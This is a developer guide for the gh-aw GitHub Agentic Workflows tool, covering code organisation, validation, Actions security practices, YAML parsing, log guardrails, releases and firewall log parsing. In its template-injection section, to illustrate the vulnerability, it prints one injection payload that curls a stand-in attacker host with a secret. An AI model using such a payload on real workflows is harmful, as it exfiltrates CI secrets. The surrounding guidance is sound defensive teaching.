# Developer Instructions

This document consolidates technical specifications and development guidelines for GitHub Agentic Workflows (gh-aw). It provides comprehensive guidance on code organization, validation architecture, security practices, and implementation patterns.

## Table of Contents

- [Capitalization Guidelines](#capitalization-guidelines)
- [Code Organization](#code-organization)
- [Validation Architecture](#validation-architecture)
- [Security Best Practices](#security-best-practices)
- [Safe Output Messages](#safe-output-messages)
- [Schema Validation](#schema-validation)
- [YAML Compatibility](#yaml-compatibility)
- [MCP Logs Guardrail](#mcp-logs-guardrail)
- [Release Management](#release-management)
- [Firewall Log Parsing](#firewall-log-parsing)

---

## Capitalization Guidelines

The gh-aw CLI follows context-based capitalization to distinguish between the product name and generic workflow references.

### Capitalization Rules

| Context | Format | Example |
|---------|--------|---------|
| Product name | **Capitalized** | "GitHub Agentic Workflows CLI from GitHub Next" |
| Generic workflows | **Lowercase** | "Enable agentic workflows" |
| Technical terms | **Capitalized** | "Compile Markdown to YAML workflows" |

This convention distinguishes between the product name (GitHub Agentic Workflows) and the concept (agentic workflows), following industry standards similar to "GitHub Actions" vs. "actions".

### Implementation

The capitalization rules are enforced through automated tests in `cmd/gh-aw/capitalization_test.go` that run as part of the standard test suite.

---

## Code Organization

### File Organization Principles

The codebase follows clear patterns for organizing code by functionality rather than type. This section provides guidance on maintaining code quality and structure.

#### Prefer Many Small Files Over Large Ones

Organize code into focused files of 100-500 lines rather than creating large monolithic files.

**Example:**
```
create_issue.go (160 lines)
create_pull_request.go (238 lines)
create_discussion.go (118 lines)
```

#### Group by Functionality, Not by Type

**Recommended approach:**
```
create_issue.go            # Issue creation logic
create_issue_test.go       # Issue creation tests
add_comment.go             # Comment addition logic
add_comment_test.go        # Comment tests
```

**Avoid:**
```
models.go                  # All structs
logic.go                   # All business logic
tests.go                   # All tests
```

### Excellent Patterns to Follow

#### Create Functions Pattern

One file per GitHub entity creation operation:
- `create_issue.go` - GitHub issue creation logic
- `create_pull_request.go` - Pull request creation logic
- `create_discussion.go` - Discussion creation logic
- `create_code_scanning_alert.go` - Code scanning alert creation

Benefits:
- Clear separation of concerns
- Easy to locate specific functionality
- Prevents files from becoming too large
- Facilitates parallel development

#### Engine Separation Pattern

Each AI engine has its own file with shared helpers in `engine_helpers.go`:
- `copilot_engine.go` - GitHub Copilot engine
- `claude_engine.go` - Claude engine
- `codex_engine.go` - Codex engine
- `custom_engine.go` - Custom engine support
- `engine_helpers.go` - Shared engine utilities

#### Test Organization Pattern

Tests live alongside implementation files:
- Feature tests: `feature.go` + `feature_test.go`
- Integration tests: `feature_integration_test.go`
- Specific scenario tests: `feature_scenario_test.go`

### File Size Guidelines

| Category | Lines | Use Case | Example |
|----------|-------|----------|---------|
| Small files | 50-200 | Utilities, simple features | `args.go` (65 lines) |
| Medium files | 200-500 | Most feature implementations | `create_issue.go` (160 lines) |
| Large files | 500-800 | Complex features | `permissions.go` (905 lines) |
| Very large files | 800+ | Core infrastructure only | `compiler.go` (1596 lines) |

### Decision Tree: Creating New Files


### Decision Tree: Splitting Files


### Anti-Patterns to Avoid

#### God Files
Single file doing everything - split by responsibility instead.

#### Vague Naming
Avoid non-descriptive file names like `utils.go`, `helpers.go`, `misc.go`, `common.go`.

Use specific names like `string_utils.go` or `engine_helpers.go` only when truly shared.

#### Mixed Concerns
Keep files focused on one domain. Don't mix unrelated functionality in one file.

#### Test Pollution
Split tests by scenario rather than having one massive test file.

#### Premature Abstraction
Wait until you have 2-3 use cases before extracting common patterns.

---

## Validation Architecture

The validation system ensures workflow configurations are correct, secure, and compatible with GitHub Actions before compilation.

### Architecture Overview


### Centralized Validation

**Location:** `pkg/workflow/validation.go` (782 lines)

**Purpose:** General-purpose validation that applies across the entire workflow system

**Key Functions:**
- `validateExpressionSizes()` - Ensures GitHub Actions expression size limits
- `validateContainerImages()` - Verifies Docker images exist and are accessible
- `validateRuntimePackages()` - Validates runtime package dependencies
- `validateGitHubActionsSchema()` - Validates against GitHub Actions YAML schema
- `validateNoDuplicateCacheIDs()` - Ensures unique cache identifiers
- `validateSecretReferences()` - Validates secret reference syntax
- `validateRepositoryFeatures()` - Checks repository capabilities
- `validateHTTPTransportSupport()` - Validates HTTP transport configuration
- `validateWorkflowRunBranches()` - Validates workflow run branch configuration

**When to add validation here:**
- Cross-cutting concerns that span multiple domains
- Core workflow integrity checks
- GitHub Actions compatibility validation
- General schema and configuration validation
- Repository-level feature detection

### Domain-Specific Validation

Domain-specific validation is organized into separate files:

#### Strict Mode Validation

**Files:** `pkg/workflow/strict_mode.go`, `pkg/workflow/validation_strict_mode.go`

Enforces security and safety constraints in strict mode:
- `validateStrictPermissions()` - Refuses write permissions
- `validateStrictNetwork()` - Requires explicit network configuration
- `validateStrictMCPNetwork()` - Requires network config on custom MCP servers
- `validateStrictBashTools()` - Refuses bash wildcard tools

#### Python Package Validation

**File:** `pkg/workflow/pip.go`

Validates Python package availability on PyPI:
- `validatePipPackages()` - Validates pip packages
- `validateUvPackages()` - Validates uv packages

#### NPM Package Validation

**File:** `pkg/workflow/npm.go`

Validates NPX package availability on npm registry.

#### Expression Safety

**File:** `pkg/workflow/expression_safety.go`

Validates GitHub Actions expression security with allowlist-based validation.

### Validation Decision Tree


### Validation Patterns

#### Allowlist Validation

Used for security-sensitive validation with limited set of valid options:

```go
func validateExpressionSafety(content string) error {
    matches := expressionRegex.FindAllStringSubmatch(content, -1)
    var unauthorizedExpressions []string

    for _, match := range matches {
        expression := strings.TrimSpace(match[1])
        if !isAllowed(expression) {
            unauthorizedExpressions = append(unauthorizedExpressions, expression)
        }
    }

    if len(unauthorizedExpressions) > 0 {
        return fmt.Errorf("unauthorized expressions: %v", unauthorizedExpressions)
    }
    return nil
}
```

#### External Resource Validation

Used for validating external dependencies:

```go
func validateDockerImage(image string, verbose bool) error {
    cmd := exec.Command("docker", "inspect", image)
    output, err := cmd.CombinedOutput()

    if err != nil {
        pullCmd := exec.Command("docker", "pull", image)
        if pullErr := pullCmd.Run(); pullErr != nil {
            return fmt.Errorf("docker image not found: %s", image)
        }
    }
    return nil
}
```

#### Schema Validation

Used for configuration file validation:

```go
func (c *Compiler) validateGitHubActionsSchema(yamlContent string) error {
    schema := loadGitHubActionsSchema()

    var data interface{}
    if err := yaml.Unmarshal([]byte(yamlContent), &data); err != nil {
        return err
    }

    if err := schema.Validate(data); err != nil {
        return fmt.Errorf("schema validation failed: %w", err)
    }
    return nil
}
```

#### Progressive Validation

Used for applying multiple validation checks in sequence:

```go
func (c *Compiler) validateStrictMode(frontmatter map[string]any, networkPermissions *NetworkPermissions) error {
    if !c.strictMode {
        return nil
    }

    if err := c.validateStrictPermissions(frontmatter); err != nil {
        return err
    }

    if err := c.validateStrictNetwork(networkPermissions); err != nil {
        return err
    }

    return nil
}
```

---

## Security Best Practices

This section outlines security best practices for GitHub Actions workflows based on static analysis tools (actionlint, zizmor, poutine) and security research.

### Template Injection Prevention

Template injection occurs when untrusted input is used directly in GitHub Actions expressions, allowing attackers to execute arbitrary code or access secrets.

#### Understanding the Risk

GitHub Actions expressions (`${{ }}`) are evaluated before workflow execution. If untrusted data (issue titles, PR bodies, comments) flows into these expressions, attackers can inject malicious code.

#### Insecure Pattern

```yaml
# VULNERABLE: Direct use of untrusted input
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        run: echo "${{ github.event.issue.title }}"
```

**Why vulnerable:** Issue title is directly interpolated. An attacker can inject: `"; curl evil.com/?secret=$SECRET; echo "`

#### Secure Pattern: Environment Variables

```yaml
# SECURE: Use environment variables
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "$ISSUE_TITLE"
```

**Why secure:** Expression is evaluated in controlled context (environment variable assignment). Shell receives value as data, not executable code.

#### Secure Pattern: Sanitized Context (gh-aw specific)

```yaml
# SECURE: Use sanitized context output
Analyze this content: "${{ needs.activation.outputs.text }}"
```

The `needs.activation.outputs.text` output is automatically sanitized:
- @mentions neutralized
- Bot triggers protected
- XML tags converted to safe format
- Only HTTPS URIs from trusted domains
- Content limits enforced (0.5MB, 65k lines)
- Control characters removed

#### Safe Context Variables

**Always safe to use in expressions:**
- `github.actor`
- `github.repository`
- `github.run_id`
- `github.run_number`
- `github.sha`

**Never safe in expressions without environment variable indirection:**
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.head_ref` (can be controlled by PR authors)

### Shell Script Best Practices

#### SC2086: Double Quote to Prevent Globbing and Word Splitting

**Insecure:**
```yaml
steps:
  - name: Process files
    run: |
      FILES=$(ls *.txt)
      for file in $FILES; do
        echo $file
      done
```

**Why vulnerable:** Variables can be split on whitespace, glob patterns are expanded, potential command injection.

**Secure:**
```yaml
steps:
  - name: Process files
    run: |
      while IFS= read -r file; do
        echo "$file"
      done < <(find . -name "*.txt")
```

#### Shell Script Security Checklist

- Always quote variable expansions: `"$VAR"`
- Use `[[ ]]` instead of `[ ]` for conditionals
- Use `$()` instead of backticks for command substitution
- Enable strict mode: `set -euo pipefail`
- Validate and sanitize all inputs
- Use shellcheck to catch common issues

**Example secure script:**
```yaml
steps:
  - name: Secure script
    env:
      INPUT_VALUE: ${{ github.event.inputs.value }}
    run: |
      set -euo pipefail

      if [[ ! "$INPUT_VALUE" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "Invalid input format"
        exit 1
      fi

      echo "Processing: $INPUT_VALUE"

      result=$(grep -r "$INPUT_VALUE" . || true)
      echo "$result"
```

### Supply Chain Security

Supply chain attacks target dependencies in CI/CD pipelines.

#### Pin Action Versions with SHA

**Insecure:**
```yaml
steps:
  - uses: actions/checkout@v4           # Tag can be moved
  - uses: actions/setup-node@main       # Branch can be updated
```

**Why vulnerable:** Tags can be deleted and recreated, branches can be force-pushed, repository ownership can change.

**Secure:**
```yaml
steps:
  - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
```

**Why secure:** SHA commits are immutable. Comments indicate human-readable version for updates.

#### Finding SHA for Actions

```bash
# Get SHA for a specific tag
git ls-remote https://github.com/actions/checkout v4.1.1

# Or use GitHub API
curl -s https://api.github.com/repos/actions/checkout/git/refs/tags/v4.1.1
```

### Workflow Structure and Permissions

#### Minimal Permissions Principle

**Insecure:**
```yaml
name: CI
on: [push]

permissions: write-all
```

**Secure:**
```yaml
name: CI
on: [push]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@sha
      - run: npm test
```

#### Job-Level Permissions

```yaml
name: CI/CD
on: [push]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@sha
      - run: npm test

  deploy:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      deployments: write
    steps:
      - uses: actions/checkout@sha
      - run: npm run deploy
```

#### Available Permissions

| Permission | Read | Write | Use Case |
|------------|------|-------|----------|
| contents | Read code | Push code | Repository access |
| issues | Read issues | Create/edit issues | Issue management |
| pull-requests | Read PRs | Create/edit PRs | PR management |
| actions | Read runs | Cancel runs | Workflow management |
| checks | Read checks | Create checks | Status checks |
| deployments | Read deployments | Create deployments | Deployment management |

### Static Analysis Integration

Integrate static analysis tools into development and CI/CD workflows:

#### Available Tools

- **actionlint** - Lints GitHub Actions workflows, validates shell scripts
- **zizmor** - Security vulnerability scanner for GitHub Actions
- **poutine** - Supply chain security analyzer

#### Running Locally

```bash
# Run individual scanners
actionlint .github/workflows/*.yml
zizmor .github/workflows/
poutine analyze .github/workflows/

# For gh-aw workflows
gh aw compile --actionlint
gh aw compile --zizmor
gh aw compile --poutine

# Strict mode: fail on findings
gh aw compile --strict --actionlint --zizmor --poutine
```

### Security Checklist

#### Template Injection
- [ ] No untrusted input in `${{ }}` expressions
- [ ] Untrusted data passed via environment variables
- [ ] Safe context variables used where possible
- [ ] Sanitized context used (gh-aw: `needs.activation.outputs.text`)

#### Shell Scripts
- [ ] All variables quoted: `"$VAR"`
- [ ] No SC2086 warnings (unquoted expansion)
- [ ] Strict mode enabled: `set -euo pipefail`
- [ ] Input validation implemented
- [ ] shellcheck passes with no warnings

#### Supply Chain
- [ ] All actions pinned to SHA (not tags/branches)
- [ ] Version comments added to pinned actions
- [ ] Actions from verified creators or reviewed
- [ ] Dependencies scanned for vulnerabilities

#### Permissions
- [ ] Minimal permissions specified
- [ ] No `write-all` permissions
- [ ] Job-level permissions used when needed
- [ ] Fork PR handling secure

#### Static Analysis
- [ ] actionlint passes (no errors)
- [ ] zizmor passes (High/Critical addressed)
- [ ] poutine passes (supply chain secure)

---

## Safe Output Messages

Safe output functions handle GitHub API write operations (creating issues, discussions, comments, PRs) from AI-generated content with consistent messaging patterns.

### Safe Output Message Flow

The following diagram illustrates how AI-generated content flows through the safe output system to GitHub API operations:

```mermaid
graph TD
    A[AI Agent Output] --> B{Staged Mode?}
    B -->|Yes| C[Generate Preview Messages]
    B -->|No| D[Process Safe Output]
    C --> E[Show 🎭 Staged Mode Preview]
    E --> F[Display in Step Summary]
    D --> G{Safe Output Type}
    G -->|create-issue| H[Create GitHub Issue]
    G -->|create-discussion| I[Create GitHub Discussion]
    G -->|add-comment| J[Add GitHub Comment]
    G -->|create-pull-request| K[Create Pull Request]
    G -->|create-pr-review-comment| L[Create PR Review Comment]
    G -->|update-issue| M[Update GitHub Issue]
    H --> N[Apply Message Patterns]
    I --> N
    J --> N
    K --> N
    L --> N
    M --> N
    N --> O[Add AI Attribution Footer]
    N --> P[Add Installation Instructions]
    N --> Q[Add Related Items Links]
    N --> R[Add Patch Preview]
    O --> S[Execute GitHub API Operation]
    P --> S
    Q --> S
    R --> S
    S --> T[Generate Success Summary]
    T --> U[Display in Step Summary]
```



**Flow Stages:**
1. **AI Agent Output** - AI generates content for GitHub operations
2. **Staged Mode Check** - Determines if operation is in preview mode
3. **Safe Output Processing** - Routes to appropriate GitHub operation type
4. **Message Pattern Application** - Applies consistent formatting (footers, instructions, links)
5. **GitHub API Execution** - Performs the actual GitHub operation
6. **Success Summary** - Reports results in workflow step summary

### Message Categories

#### AI Attribution Footer

Identifies content as AI-generated and links to workflow run:

```markdown
> AI generated by [WorkflowName](run_url)
```

With triggering context:
```markdown
> AI generated by [WorkflowName](run_url) for #123
```

#### Workflow Installation Instructions

```markdown
>
> To add this workflow in your repository, run `gh aw add owner/repo/path@ref`. See [usage guide](https://githubnext.github.io/gh-aw/tools/cli/).
```

#### Staged Mode Preview

All staged mode previews use consistent format with 🎭 emoji:

```markdown
## 🎭 Staged Mode: [Operation Type] Preview

The following [items] would be [action] if staged mode was disabled:
```

#### Patch Preview

Display git patches in pull request bodies with size limits:

```markdown
<details><summary>Show patch (45 lines)</summary>

\`\`\`diff
diff --git a/src/auth.js b/src/auth.js
index 1234567..abcdefg 100644
--- a/src/auth.js
+++ b/src/auth.js
@@ -10,7 +10,10 @@ export async function login(username, password) {
-    throw new Error('Login failed');
+    if (response.status === 401) {
+      throw new Error('Invalid credentials');
+    }
+    throw new Error('Login error: ' + response.statusText);
\`\`\`

</details>
```

Limits: Max 500 lines or 2000 characters (truncated with "... (truncated)" if exceeded)

### Design Principles

#### Consistency
- All AI-generated content uses same blockquote footer format
- 🎭 emoji consistently marks staged preview mode
- URL patterns match GitHub conventions
- Step summaries follow same heading and list structure

#### Clarity
- Clear distinction between preview and actual operations
- Explicit error messages with actionable guidance
- Helpful fallback instructions when operations fail
- Field labels consistently use bold text

#### Discoverability
- Installation instructions included in footers when available
- Related items automatically linked across workflow outputs
- Step summaries provide quick access to created items
- Collapsible sections keep large content manageable

#### Safety
- Labels sanitized to prevent unintended @mentions
- Patch sizes validated and truncated when needed
- Staged mode allows testing without side effects
- Graceful fallbacks when primary operations fail

---

## Schema Validation

All three JSON schema files enforce strict validation with `"additionalProperties": false` at the root level, preventing typos and undefined fields from silently passing validation.

### Schema Files

| File | Purpose |
|------|---------|
| `pkg/parser/schemas/main_workflow_schema.json` | Validates agentic workflow frontmatter in `.github/workflows/*.md` files |
| `pkg/parser/schemas/included_file_schema.json` | Validates imported/included workflow files |
| `pkg/parser/schemas/mcp_config_schema.json` | Validates MCP (Model Context Protocol) server configuration |

### How It Works

When `"additionalProperties": false` is set at the root level, the validator rejects any properties not explicitly defined in the schema's `properties` section. This catches common typos:

- `permisions` instead of `permissions`
- `engnie` instead of `engine`
- `toolz` instead of `tools`
- `timeout_minute` instead of `timeout-minutes`
- `runs_on` instead of `runs-on`
- `safe_outputs` instead of `safe-outputs`

### Example Validation Error

```bash
$ ./gh-aw compile workflow-with-typo.md
✗ error: Unknown properties: toolz, engnie, permisions. Valid fields are: tools, engine, permissions, ...
```

### Validation Process


### Schema Embedded in Binary

Schemas are embedded in the Go binary using `//go:embed` directives:

```go
//go:embed schemas/main_workflow_schema.json
var mainWorkflowSchema string
```

This means:
- Schema changes require running `make build` to take effect
- Schemas are validated at runtime, not at build time
- No external JSON files need to be distributed with the binary

### Adding New Fields

When adding new fields to schemas:

1. Update the schema JSON file with the new property definition
2. Rebuild the binary with `make build`
3. Add test cases to verify the new field works
4. Update documentation if the field is user-facing

---

## YAML Compatibility

YAML has two major versions with incompatible boolean parsing behavior that affects workflow validation.

### The Core Issue

#### YAML 1.1 Boolean Parsing Problem

In YAML 1.1, certain plain strings are automatically converted to boolean values. The workflow trigger key `on:` can be misinterpreted as boolean `true` instead of string `"on"`.

**Example:**
```python
# Python yaml.safe_load (YAML 1.1 parser)
import yaml

content = """
on:
  issues:
    types: [opened]
"""

result = yaml.safe_load(content)
print(result)
# Output: {True: {'issues': {'types': ['opened']}}}
#          ^^^^ The key is boolean True, not string "on"!
```

This creates false positives when validating workflows with Python-based tools.

#### YAML 1.2 Correct Behavior

YAML 1.2 parsers treat `on`, `off`, `yes`, and `no` as regular strings, not booleans. Only explicit boolean literals `true` and `false` are treated as booleans.

**Example:**
```go
// Go goccy/go-yaml (YAML 1.2 parser) - Used by gh-aw
var result map[string]interface{}
yaml.Unmarshal([]byte(content), &result)

fmt.Printf("%+v\n", result)
// Output: map[on:map[issues:map[types:[opened]]]]
//         ^^^ The key is string "on" ✓
```

### How gh-aw Handles This

GitHub Agentic Workflows uses **`goccy/go-yaml` v1.18.0**, which is a **YAML 1.2 compliant parser**:

- ✅ `on:` is correctly parsed as a string key, not a boolean
- ✅ Workflow frontmatter validation works correctly
- ✅ GitHub Actions YAML is compatible (GitHub Actions also uses YAML 1.2 parsing)

### Compatibility Flow


### Affected Keywords

YAML 1.1 treats these as booleans (parsed as `true` or `false`):

**Parsed as `true`:** on, yes, y, Y, YES, Yes, ON, On
**Parsed as `false`:** off, no, n, N, NO, No, OFF, Off

YAML 1.2 treats all of the above as strings. Only these are booleans: `true`, `false`

### Recommendations

#### For Workflow Authors

1. **Use gh-aw's compiler for validation:**
   ```bash
   gh aw compile workflow.md
   ```

2. **Don't trust Python yaml.safe_load for validation** - it will give false positives for the `on:` trigger key.

3. **Use explicit booleans when you mean boolean values:**
   ```yaml
   enabled: true      # Explicit boolean
   disabled: false    # Explicit boolean

   # Avoid for boolean values:
   enabled: yes       # Might be confusing across parsers
   disabled: no       # Might be confusing across parsers
   ```

#### For Tool Developers

1. **Use YAML 1.2 parsers for gh-aw integration:**
   - Go: `github.com/goccy/go-yaml`
   - Python: `ruamel.yaml` (with YAML 1.2 mode)
   - JavaScript: `yaml` package v2+ (YAML 1.2 by default)
   - Ruby: `Psych` (YAML 1.2 by default in Ruby 2.6+)

2. **Document parser version in your tool**

3. **Consider adding compatibility mode** to switch between YAML 1.1 and 1.2 parsing

---

## MCP Logs Guardrail

The MCP server `logs` command includes an automatic guardrail to prevent overwhelming responses when fetching workflow logs.

### How It Works


### Normal Operation (Output ≤ Token Limit)

When output is within the token limit (default: 12000 tokens), the command returns full JSON data:

```json
{
  "summary": {
    "total_runs": 5,
    "total_duration": "2h30m",
    "total_tokens": 45000,
    "total_cost": 0.23
  },
  "runs": [...],
  "tool_usage": [...]
}
```

### Guardrail Triggered (Output > Token Limit)

When output exceeds the token limit, the command returns structured response with:

```json
{
  "message": "⚠️  Output size (15000 tokens) exceeds the limit (12000 tokens). To reduce output size, use the 'jq' parameter with one of the suggested queries below.",
  "output_tokens": 15000,
  "output_size_limit": 12000,
  "schema": { ... },
  "suggested_queries": [
    {
      "description": "Get only the summary statistics",
      "query": ".summary",
      "example": "Use jq parameter: \".summary\""
    },
    ...
  ]
}
```

### Configuring the Token Limit

Default limit is 12000 tokens (approximately 48KB of text). Customize using the `max_tokens` parameter:

```json
{
  "name": "logs",
  "arguments": {
    "count": 100,
    "max_tokens": 20000
  }
}
```

Token estimation uses approximately 4 characters per token (OpenAI's rule of thumb).

### Using the jq Parameter

Filter output using jq syntax:

**Get only summary statistics:**
```json
{ "jq": ".summary" }
```

**Get run IDs and basic info:**
```json
{ "jq": ".runs | map({database_id, workflow_name, status})" }
```

**Get only failed runs:**
```json
{ "jq": ".runs | map(select(.conclusion == \"failure\"))" }
```

**Get high token usage runs:**
```json
{ "jq": ".runs | map(select(.token_usage > 10000))" }
```

### Implementation Details

**Constants:**
- `DefaultMaxMCPLogsOutputTokens`: 12000 tokens (default limit)
- `CharsPerToken`: 4 characters per token (estimation factor)

**Files:**
- `pkg/cli/mcp_logs_guardrail.go` - Core guardrail implementation
- `pkg/cli/mcp_logs_guardrail_test.go` - Unit tests
- `pkg/cli/mcp_logs_guardrail_integration_test.go` - Integration tests
- `pkg/cli/mcp_server.go` - Integration with MCP server

### Benefits

1. Prevents overwhelming responses for AI models
2. Provides guidance with specific filters
3. Self-documenting with schema description
4. Preserves functionality with jq filtering
5. Transparent messaging about why guardrail triggered

---

## Release Management

The project uses a minimalistic changeset-based release system inspired by `@changesets/cli`.

### Commands

#### version (Preview Only)

The `version` command operates in preview mode and never modifies files:

```bash
node scripts/changeset.js version
# Or
make version
```

This command:
- Reads all changeset files from `.changeset/` directory
- Determines the appropriate version bump (major > minor > patch)
- Shows a preview of the CHANGELOG entry
- Never modifies any files

#### release [type] [--yes|-y]

The `release` command creates an actual release:

```bash
node scripts/changeset.js release
# Or (recommended - runs tests first)
make release
```

This command:
- Checks prerequisites (clean tree, main branch)
- Updates `CHANGELOG.md` with new version and changes
- Deletes processed changeset files (if any exist)
- Automatically commits the changes
- Creates and pushes a git tag for the release

**Flags:**
- `--yes` or `-y`: Skip confirmation prompt

### Release Workflow


### Changeset File Format

Changeset files are markdown files in `.changeset/` directory with YAML frontmatter:

```markdown
---
"gh-aw": patch
---

Brief description of the change
```

**Bump types:**
- `patch` - Bug fixes and minor changes (0.0.x)
- `minor` - New features, backward compatible (0.x.0)
- `major` - Breaking changes (x.0.0)

### Prerequisites for Release

When running `release`, the script checks:

1. **Clean working tree:** All changes must be committed or stashed
2. **On main branch:** Must be on the `main` branch to create a release

### Releasing Without Changesets

For maintenance releases with dependency updates:

```bash
# Defaults to patch release
node scripts/changeset.js release

# Or specify release type explicitly
node scripts/changeset.js release minor

# Skip confirmation
node scripts/changeset.js release --yes
```

The script will:
- Default to patch release if no type specified
- Add a generic "Maintenance release" entry to CHANGELOG.md
- Commit the changes
- Create a git tag
- Push the tag to remote

---

## Firewall Log Parsing

The firewall log parser provides analysis of network traffic logs from agentic workflow runs.

### Log Format

Firewall logs use space-separated format with 10 fields:

```
timestamp client_ip:port domain dest_ip:port proto method status decision url user_agent
```

**Example:**
```
1761332530.474 172.30.0.20:35288 api.enterprise.githubcopilot.com:443 140.82.112.22:443 1.1 CONNECT 200 TCP_TUNNEL:HIER_DIRECT api.enterprise.githubcopilot.com:443 "-"
```

### Field Descriptions

1. **timestamp** - Unix timestamp with decimal (e.g., "1761332530.474")
2. **client_ip:port** - Client IP and port or "-"
3. **domain** - Target domain:port or "-"
4. **dest_ip:port** - Destination IP and port or "-"
5. **proto** - Protocol version (e.g., "1.1") or "-"
6. **method** - HTTP method (e.g., "CONNECT", "GET") or "-"
7. **status** - HTTP status code (e.g., "200", "403") or "0"
8. **decision** - Proxy decision (e.g., "TCP_TUNNEL:HIER_DIRECT") or "-"
9. **url** - Request URL or "-"
10. **user_agent** - User agent string (quoted) or "-"

### Request Classification


**Allowed Indicators:**
- Status codes: 200, 206, 304
- Decisions containing: TCP_TUNNEL, TCP_HIT, TCP_MISS

**Denied Indicators:**
- Status codes: 403, 407
- Decisions containing: NONE_NONE, TCP_DENIED

**Default:** Denied (for safety when classification is ambiguous)

### Output Examples

#### Console Output

```
🔥 Firewall Log Analysis
Total Requests   : 8
Allowed Requests : 5
Denied Requests  : 3

Allowed Domains:
  ✓ api.enterprise.githubcopilot.com:443 (1 requests)
  ✓ api.github.com:443 (2 requests)

Denied Domains:
  ✗ blocked-domain.example.com:443 (2 requests)
```

#### JSON Output

```json
{
  "firewall_log": {
    "total_requests": 8,
    "allowed_requests": 5,
    "denied_requests": 3,
    "allowed_domains": [
      "api.enterprise.githubcopilot.com:443",
      "api.github.com:443"
    ],
    "denied_domains": [
      "blocked-domain.example.com:443"
    ],
    "requests_by_domain": {
      "api.github.com:443": {
        "allowed": 2,
        "denied": 0
      }
    }
  }
}
```

### Integration Points

The `logs` and `audit` commands automatically:
1. Search for firewall logs in run directories
2. Parse all `.log` files in `firewall-logs/` or `squid-logs/` directories
3. Aggregate statistics across all log files
4. Include firewall analysis in console and JSON output
5. Cache results in `run_summary.json`

### Implementation

**Files:**
- `pkg/cli/firewall_log.go` (396 lines) - Core parser implementation
- `pkg/cli/firewall_log_test.go` (437 lines) - Unit tests
- `pkg/cli/firewall_log_integration_test.go` (238 lines) - Integration tests

**Testing:**
```bash
# Unit tests
make test-unit

# Integration tests
go test ./pkg/cli -run TestFirewallLogIntegration
```

---

**Last Updated:** 2025-11-06
**Maintainers:** GitHub Next Team
